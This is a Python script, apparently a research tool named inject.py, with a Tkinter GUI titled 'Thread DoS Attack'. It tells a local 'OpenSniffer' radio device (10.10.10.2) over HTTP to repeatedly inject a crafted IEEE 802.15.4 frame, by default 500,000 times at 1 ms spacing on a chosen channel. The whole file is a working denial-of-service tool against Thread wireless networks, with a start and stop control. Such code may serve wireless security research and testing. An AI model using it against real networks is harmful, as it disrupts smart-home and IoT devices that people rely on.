#python3
import requests
import sys
import tkinter as tk
import tkinter.font as tkFont

''' Command options:
   -ch <channel number>                          : default = 15
   -ifs <interframe spacing (ms)>                : default = 1 ms
   -rep <number of frame transmit repititions>   : default = 500000
   
   eg: python3 inject.py -ch 25 -ifs 2 -rep 1000

'''

# These are the same parameters as on the web interface
CHANNEL_DEFAULT = 15
IFS_DEFAULT = 1 # ms
NREPEAT_DEFAULT = 500000 # 2436 seconds worth

IPV4_ADDR = "10.10.10.2"

chn = CHANNEL_DEFAULT
modul = 0
txlevel = 0 #  '0' equiv. to +3dBm
rxen = 0
nrepeat = NREPEAT_DEFAULT
#nrepeat = 800 
tspace = IFS_DEFAULT
autocrc = 1 # must be set to '1'
                    
# Set payload #
spayload = "6998"  # 0x9869
spayload += "00"   # Seq No. not req.d 
spayload += "0000" # valid PAN ID not req.d 
spayload += "0000" # destination address not req.d
spayload += "0000"# source address not req.d
spayload += "00" # Security control not req.d
spayload += "00000000" # Frame counter
spayload += "00" # Key Ident 
spayload += "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
spayload += "001122334455667788"

packetlen = len(spayload) # minimum valid packet size

PARAMS = {'chn': chn,
          'modul':modul,
          'txlevel':txlevel,
          'rxen':rxen,
          'nrepeat': nrepeat,
          'tspace' : tspace,
          'autocrc' : autocrc,
          'spayload' : spayload,
          'len': packetlen}

INJECT_URL = f"http://{IPV4_ADDR}/inject.cgi"
STATUS_URL = f"http://{IPV4_ADDR}/status.cgi"

print("OpenSniffer command tool")
print("------------------------")
print("channel = %d, ifs = %d ms, packet size = %d bytes, repeat = %d" % (chn, tspace, packetlen, nrepeat))
state = "run"
        
def handle_stop_press():
    r = requests.get(url = STATUS_URL, params = "p=0")

def handle_start_press():    
    ifs = ifs_var.get()
    try:
        ifs = int(ifs)
    except:
        ifs = IFS_DEFAULT
    PARAMS['tspace'] = ifs
    r = requests.get(url = INJECT_URL, params = PARAMS)
    if(r.status_code != 200):
        exit()
        
# Function to resize font based on button size
def resize_font(event):
    # Calculate the new font size based on the button height
    new_size = -max(12, int(event.height / 3))
    start_font.configure(size=new_size)
    stop_font.configure(size=new_size)
        
# Create the main window
root = tk.Tk()
root.title("Thread DoS Attack")

ifs_var = tk.StringVar()

# Create a frame for the title
title_frame = tk.Frame(root, padx=10, pady=10)
title_frame.pack(fill=tk.X)

# Create and pack the title label
title_label = tk.Label(title_frame, text="Start and Stop Thread DoS Attack", font=("Helvetica", 16))
title_label.pack(fill=tk.X)

# Define fonts for the buttons
start_font = tkFont.Font(family="Helvetica", size=20)
stop_font = tkFont.Font(family="Helvetica", size=20)

ifs_label = tk.Label(root, text="Interframe Spacing (ms):", font=start_font)
ifs_entry = tk.Entry(root, textvariable=ifs_var, font=start_font)
ifs_label.pack()
ifs_entry.pack()

# Create a frame to hold the buttons with padding
button_frame = tk.Frame(root, padx=10, pady=10)
button_frame.pack(expand=True, fill=tk.BOTH)

# Create the start button
start_button = tk.Button(button_frame, text="Start", bg="green", command=handle_start_press, font=start_font)
start_button.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=5, pady=5)

# Create the stop button
stop_button = tk.Button(button_frame, text="Stop", bg="red", command=handle_stop_press, font=stop_font)
stop_button.pack(side=tk.RIGHT, expand=True, fill=tk.BOTH, padx=5, pady=5)

# Bind the resize event to adjust the font size dynamically
start_button.bind("<Configure>", resize_font)
stop_button.bind("<Configure>", resize_font)

# Start the Tkinter event loop
root.mainloop()     
